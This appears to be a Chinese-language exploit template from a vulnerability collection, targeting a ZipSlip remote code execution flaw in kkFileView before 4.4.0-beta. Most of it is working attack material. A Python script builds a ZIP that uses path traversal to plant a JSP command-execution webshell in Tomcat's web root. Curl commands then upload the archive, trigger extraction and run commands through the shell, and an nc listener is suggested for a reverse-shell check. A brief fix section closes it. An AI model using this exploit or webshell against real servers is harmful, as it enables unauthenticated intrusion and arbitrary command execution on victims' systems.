---
id: KKFILEVIEW-4.3-ZIPSLIP-RCE
title: kkFileView ZipSlip 远程命令执行漏洞
product: kkfileview
vendor: kkFileView
version_affected: "<4.4.0-beta"
severity: CRITICAL
tags: [rce, file_upload, 无需认证]
fingerprint: ["kkFileView"]
---

## 漏洞描述

kkFileView 4.4.0-beta 之前版本存在 ZipSlip 漏洞。攻击者可以通过上传包含路径穿越文件名的 ZIP 压缩包，向服务器任意目录写入文件。配合 LibreOffice 宏执行或 JSP webshell 写入实现远程代码执行。

## 影响版本

- kkFileView < 4.4.0-beta

## 前置条件

- 无需认证
- 需要能够上传文件和预览文件

## 利用步骤

1. 构造包含路径穿越条目的恶意 ZIP 文件
2. 上传恶意 ZIP 到 kkFileView
3. 触发 ZIP 预览/解压，写入 webshell 到 web 目录
4. 访问 webshell 执行命令

## Payload

```bash
# 1. 生成恶意 ZIP（路径穿越写入 JSP webshell）
python3 -c "
import zipfile, io, sys
# JSP webshell 内容
shell = b'<%Runtime rt = Runtime.getRuntime();String[] commands = {\"sh\",\"-c\",request.getParameter(\"cmd\")};Process proc = rt.exec(commands);java.io.InputStream is = proc.getInputStream();java.util.Scanner s = new java.util.Scanner(is).useDelimiter(\"\\\\A\");out.println(s.hasNext() ? s.next() : \"\");%>'
with zipfile.ZipFile('evil.zip', 'w') as z:
    # 路径穿越 — 根据目标部署路径调整
    z.writestr('../../../tomcat/webapps/ROOT/cmd.jsp', shell)
    # 同时放一个正常文件避免报错
    z.writestr('readme.txt', b'hello')
print('Generated evil.zip')
"

# 2. 上传恶意 ZIP
curl -X POST "http://target:8012/fileUpload" \
  -F "file=@evil.zip"
# 记录返回的文件 URL

# 3. 触发预览（解压 ZIP）
curl -s "http://target:8012/onlinePreview?url=<base64编码的文件URL>"

# 4. 访问写入的 webshell
curl -s "http://target:8012/cmd.jsp?cmd=id"
```

## 验证方法

```bash
# 访问 webshell 检查命令输出
curl -s "http://target:8012/cmd.jsp?cmd=id" | grep "uid="

# 如果 webshell 路径不确定，用回连验证
# 修改 ZIP 中的 webshell 为回连命令
# 然后在攻击机监听: nc -lvp 8888
```

## 修复建议

1. 升级 kkFileView 至 4.4.0+
2. 修复路径穿越问题
3. 对上传文件进行安全检查
